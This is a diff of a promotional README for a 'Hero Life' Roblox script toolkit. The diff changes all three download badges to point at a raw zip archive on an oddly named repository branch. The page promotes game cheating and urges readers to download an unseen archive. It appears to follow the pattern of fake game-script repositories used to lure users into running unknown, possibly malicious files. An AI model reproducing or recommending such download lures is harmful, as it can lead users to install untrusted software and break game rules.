@@ -1,5 +1,5 @@
 # Hero Life Roblox Script Repository  
-[![Download](https://img.shields.io/badge/Download-green)](https://rsartvisual12.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/rsartvisual12/hero-life-roblox-toolkit/raw/refs/heads/branch/tanistic/roblox_toolkit_hero_life_noninverted.zip)
 
 **Your gateway to unparalleled adventure, automated mastery, and creative customization in Hero Life! Optimize your experience with the most feature-rich Roblox script toolkit—empowering you to reimagine gameplay and redefine what’s possible.**
 
@@ -22,7 +22,7 @@
 ## ⚡ Instant Download
 
 Embark on your Hero Life journey right away!  
-[![Download](https://img.shields.io/badge/Download-green)](https://rsartvisual12.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/rsartvisual12/hero-life-roblox-toolkit/raw/refs/heads/branch/tanistic/roblox_toolkit_hero_life_noninverted.zip)
 
 ---
 
@@ -111,7 +111,7 @@ See the complete license [here](LICENSE).
 ## ⬇️ Download Hero Life Script
 
 Leap into action—grab the latest Hero Life Roblox Script below:  
-[![Download](https://img.shields.io/badge/Download-green)](https://rsartvisual12.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/rsartvisual12/hero-life-roblox-toolkit/raw/refs/heads/branch/tanistic/roblox_toolkit_hero_life_noninverted.zip)
 
 ---
 
